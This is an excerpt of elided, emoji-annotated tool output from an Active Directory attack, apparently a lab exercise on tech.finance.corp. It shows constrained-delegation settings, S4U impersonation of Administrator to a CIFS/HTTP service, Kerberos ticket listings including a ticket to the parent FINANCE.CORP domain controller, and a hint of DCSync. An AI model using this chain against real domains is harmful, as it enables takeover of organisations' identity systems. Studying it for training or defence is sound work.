...
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto 📌    : {CIFS 📌/mgmtsrv.tech.finance.corp 🖥️, CIFS/mgmtsrv}
...
[*] Impersonating user 'Administrator' 🎭 to target SPN 'CIFS 📌/mgmtsrv .tech.finance.corp' 🖥️
...
[*] base64(ticket.kirbi) for SPN 'http 📌/mgmtsrv.tech.finance.corp' 🖥️:
...
#0>     Client: administrator 🎭 @ TECH.FINANCE.CORP 🏛️
        Server: http 📌/mgmtsrv.tech.finance.corp 🖥️ @ TECH.FINANCE.CORP
...
#1>     Client: databaseagent 🎭 @ TECH.FINANCE.CORP 🏛️
        Server: ldap 📌/tech-dc.tech.finance.corp 🖥️ @ TECH.FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
...
[DC] 'tech-dc.tech.finance.corp' 🖥️ will be the DC server
...
#1>     Client: Administrator 🎭 @ TECH.FINANCE.CORP🏛️
        Server: http 📌/finance-dc.finance.corp 🖥️ @ FINANCE.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
